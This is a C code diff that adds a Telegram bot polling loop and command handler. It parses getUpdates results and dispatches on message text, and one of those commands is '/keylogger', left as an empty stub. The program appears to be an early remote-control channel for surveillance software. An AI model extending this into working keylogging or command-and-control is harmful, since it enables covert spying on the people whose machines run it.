@@ -2,9 +2,15 @@
 #include <string.h>
 #include <pthread.h>
 #include <curl/curl.h>
+#include <json-c/json.h>
+#include <time.h>
 #include "utils.h"
+#include "fiobj.h"
 
 char *base_uri;
+int init_date;
+
+int last_update_id = 0;
 
 void init_telegram(char* token) {
     base_uri = malloc((28 + strlen(token) + 1) * sizeof(char));
@@ -15,6 +21,10 @@ void init_telegram(char* token) {
     }
     strcpy(base_uri, "https://api.telegram.org/bot");
     strcat(base_uri, token);
+
+    init_date = (int) time(NULL);
+
+    fflush(stdout);
 }
 
 void send_message(const char* json_string) {
@@ -63,7 +73,7 @@ void send_picture(const char* json_string) {
   fflush(stdout);
 }
 
-void get_updates() {
+void fetch_updates(json_object **buffer) {
   CURL *curl;
   CURLcode res;
 
@@ -101,7 +111,7 @@ void get_updates() {
     if (res != CURLE_OK) {
       fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
     } else {
-      // TODO: Do something with the data
+      *buffer = json_tokener_parse(chunk.memory);
     }
 
     curl_easy_cleanup(curl);
@@ -109,15 +119,54 @@ void get_updates() {
   }
   
   curl_global_cleanup();
-  fflush(stdout); // Flush for curl outpu
+  fflush(stdout);
 }
 
 void* handle_cmds() {
-  while (1) {
-    // get_updates() (https://core.telegram.org/bots/api#getupdates)
+  while(!fio_is_running()) {
+    sleep(1);
+  }
+
+  struct json_object *obj, *ok, *result;
+  int update_len, i;
+
+  while (fio_is_running()) {
+    fetch_updates(&obj);
+
+    if (obj != NULL) {
+      json_object_object_get_ex(obj, "ok", &ok);
+      json_object_object_get_ex(obj, "result", &result);
+
+      printf("Ok: %d\n", json_object_get_boolean(ok));
+      printf("Result Size: %zu\n", json_object_get_array(result)->length);
+
+      update_len = json_object_array_length(result);
+      if (update_len > 0) {
+        for (i = 0; i < update_len; i++) {
+          struct json_object* update_obj = json_object_array_get_idx(result, i);
+          int update_id = json_object_get_int(json_object_object_get(update_obj, "update_id"));
+
+          if (update_id > last_update_id) {
+            struct json_object* message_obj = json_object_object_get(update_obj, "message");
+            int d = json_object_get_int(json_object_object_get(message_obj, "date"));
+            if (d >= init_date) {
+              // Now we actually do something
+              char* cmd_label = json_object_get_string(json_object_object_get(message_obj, "text"));
+              if (strcmp(cmd_label, "/keylogger") == 0) {
+                // Continue
+              }
+
+              last_update_id = update_id;
+            }
+          }
+        }
+      }
+    }
 
     sleep(1);
   }
+
+  printf("INFO: Shutting down command thread.\n");
 
   // printf("Hi mate I am so cool did you know that?");
   // fflush(stdout);
